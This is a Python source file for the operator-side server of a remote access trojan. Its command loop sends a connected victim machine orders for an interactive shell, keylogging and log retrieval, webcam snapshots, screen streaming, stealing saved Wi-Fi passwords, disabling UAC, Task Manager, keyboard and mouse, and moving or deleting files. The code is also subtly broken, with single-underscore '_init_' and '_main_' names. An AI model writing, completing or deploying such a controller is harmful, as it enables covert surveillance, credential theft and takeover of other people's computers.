import random
import socket, os

class RAT_SERVER:
    def _init_(self, host, port):
         # Initialize server with host and port configuration
        self.host = host
        self.port = port
    
    def build_connection(self):
         # Establish TCP socket connection and wait for client
        global client, addr, s
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((self.host, self.port))
        s.listen(5)
        print("[*] Waiting for the client...")
        client, addr = s.accept()
        print()
        ipcli = client.recv(1024).decode()
        print(f"[*] Connection is established successfully with {ipcli}")
        print()
    
    def server(self):
         # Initialize video streaming server for screen sharing/webcam      
        try:
            from vidstream import StreamingServer
            global server
            server = StreamingServer(self.host, 8080)
            server.start_server()
        except:
            print("Module not found...")
    
    def stop_server(self):
        # Stop the video streaming server
        server.stop_server()
    
    def result(self):
          # Send command to client and receive/print response
        client.send(command.encode())
        result_output = client.recv(1024).decode()
        print(result_output)
    
    def banner(self):
        print("======================================================")
        print("Network: ")
        print("======================================================")
        print(f'''
ipconfig                  local ip
portscan                  port scanner
profiles                  network profiles
profilepswd               password for profile
''')

        print("======================================================")
        print("Files:")
        print("======================================================")
        print(f'''
delfile <file>            delete file
editfile <file> <text>    edit file
createfile <file>         create file
download <file> <homedir> download file
upload                    upload file
cp <file1> <file2>        copy file
mv <file> <path>          move file
searchfile <file> <dir>   search for file in mentioned directory
mkdir <dirname>           make directory
rmdir <dirname>           remove directory
startfile <file>          start file
readfile <file>           read from file
        ''')
        print("======================================================")
    
     # Main command execution loop
        # Handles all supported commands and their implementations
    def execute(self):
        self.banner()
        while True:
            global command
            command = input('Command >>  ')

            # Shell command handling
            if command == 'shell':
                 # Interactive shell mode
                client.send(command.encode())
                while 1:
                    command = str(input('>> '))
                    client.send(command.encode())
                    if command.lower() == 'exit':
                        break
                    result_output = client.recv(1024).decode()
                    print(result_output)
                client.close()
                s.close()
            
            elif command == 'drivers':
                self.result()
            
            elif command == 'disableUAC':
                self.result()
            
            elif command == 'reboot':
                self.result()
            
            elif command == 'usbdrivers':
                self.result()
            
            elif command == 'volumeup':
                self.result()
            
            elif command == 'volumedown':
                self.result()
            
            elif command == 'monitors':
                self.result()
            
            elif command[:4] == 'kill':
                if not command[5:]:
                    print("No process mentioned to terminate")
                else:
                    self.result()
            
            elif command == 'extendrights':
                self.result()
            
            elif command == 'geolocate':
                self.result()
            
            elif command == 'turnoffmon':
                self.result()
            
            elif command == 'turnonmon':
                self.result()
            
            elif command == 'setwallpaper':
                client.send(command.encode())
                text = str(input("Enter the filename: "))
                client.send(text.encode())
                result_output = client.recv(1024).decode()
                print(result_output)
            
            elif command == 'keyscan_start':
                client.send(command.encode())
                result_output = client.recv(1024).decode()
                print(result_output)
            
            elif command == 'send_logs':
                client.send(command.encode())
                result_output = client.recv(1024).decode()
                print(result_output)
            
            elif command == 'stop_keylogger':
                client.send(command.encode())
                result_output = client.recv(1024).decode()
                print(result_output)
            
            elif command[:7] == 'delfile':
                if not command[8:]:
                    print("No file to delete")
                else:
                    self.result()
            
            elif command[:10] == 'createfile':
                if not command[11:]:
                    print("No file to create")
                else:
                    self.result()
            
            elif command == 'tasklist':
                self.result()
            
            elif command == 'ipconfig':
                self.result()
            
            elif command[:7] == 'writein':
                if not command[8:]:
                    print("No text to output")
                else:
                    self.result()
            
            elif command == 'sendmessage':
                client.send(command.encode())
                text = str(input("Enter the text: "))
                client.send(text.encode())
                title = str(input("Enter the title: "))
                client.send(title.encode())
                result_output = client.recv(1024).decode()
                print(result_output)
            
            elif command == 'profilepswd':
                client.send(command.encode())
                profile = str(input("Enter the profile name: "))
                client.send(profile.encode())
                result_output = client.recv(2147483647).decode()
                print(result_output)
            
            elif command == 'profiles':
                self.result()

            elif command == 'cpu_cores':
                self.result()
            
            elif command[:2] == 'cd':
                if not command[3:]: 
                    print("No directory")
                else:
                    self.result()
            
            elif command == 'cd ..':
                self.result()
            
            elif command[1:2] == ':':
                self.result()
            
            elif command == 'dir':
                self.result()
            
            elif command == 'portscan':
                self.result()
            
            elif command == 'systeminfo':
                self.result()
            
            elif command == 'localtime':
                self.result()
            
            elif command[:7] == 'abspath':
                if not command[8:]:
                    print("No file")
                else:
                    self.result()
            
            elif command[:8] == 'readfile':
                if not command[9:]:
                    print("No file to read")
                else:
                    client.send(command.encode())
                    result_output = client.recv(2147483647).decode()
                    print("===================================================")
                    print(result_output)
                    print("===================================================")
            
            elif command.startswith("disable") and command.endswith("--keyboard"):
                self.result()
            
            elif command.startswith("disable") and command.endswith("--mouse"):
                self.result()
            
            elif command.startswith("disable") and command.endswith("--all"):
                self.result()
            
            elif command.startswith("enable") and command.endswith("--all"):
                self.result()
            
            elif command.startswith("enable") and command.endswith("--keyboard"):
                self.result()
            
            elif command.startswith("enable") and command.endswith("--mouse"):
                self.result()
            
            elif command[:7] == 'browser':
                client.send(command.encode())
                quiery = str(input("Enter the quiery: "))
                client.send(quiery.encode())
                result_output = client.recv(1024).decode()
                print(result_output)
            
            elif command[:2] == 'cp':
                self.result()
            
            elif command[:2] == 'mv':
                self.result()
            
            elif command[:8] == 'editfile':
                self.result()
            
            elif command[:5] == 'mkdir':
                if not command[6:]:
                    print("No directory name")
                else:
                    self.result()
            
            elif command[:5] == 'rmdir':
                if not command[6:]:
                    print("No directory name")
                else:
                    self.result()
            
            elif command[:10] == 'searchfile':
                self.result()
            
            elif command == 'curpid':
                self.result()
            
            elif command == 'sysinfo':
                self.result()
            
            elif command == 'pwd':
                self.result()

            elif command == 'breakstream':
                self.stop_server()
            
            elif command[:9] == 'startfile':
                if not command[10:]:
                    print("No file to launch")
                else:
                    self.result()
            # File operations
            elif command[:8] == 'download':
                # Download file from client
                try:
                    client.send(command.encode())
                    file = client.recv(2147483647)
                    with open(f'{command.split(" ")[2]}', 'wb') as f:
                        f.write(file)
                        f.close()
                    print("File is downloaded")
                except: 
                    print("Not enough arguments")

            elif command == 'upload':
                client.send(command.encode())
                file = str(input("Enter the filepath to the file: "))
                filename = str(input("Enter the filepath to outcoming file (with filename and extension): "))
                data = open(file, 'rb')
                filedata = data.read(2147483647)
                client.send(filename.encode())
                print("File has been sent")
                client.send(filedata)
            
            elif command == 'disabletaskmgr':
                self.result()
            
            elif command == 'enabletaskmgr':
                self.result()
            
            elif command == 'isuseradmin':
                self.result()
            
            elif command == 'help':
                self.banner()

            elif command == 'webcam_snap':
                client.send(command.encode())
                file = client.recv(2147483647)
                with open(f'{os.getcwd()}\\{random.randint(11111,99999)}.png', 'wb') as f:
                    f.write(file)
                    f.close()
                print("File is downloaded")

             # Session management
            elif command == 'exit':
                 # Terminate RAT session
                client.send(command.encode())
                output = client.recv(1024)
                output = output.decode()
                print(output)
                s.close()
                client.close()

# Initialize RAT server with localhost and port 4444
rat = RAT_SERVER('127.0.0.1', 4444)

if _name_ == '_main_':
    # Start server and begin command execution when run directly
    rat.build_connection()
    rat.execute()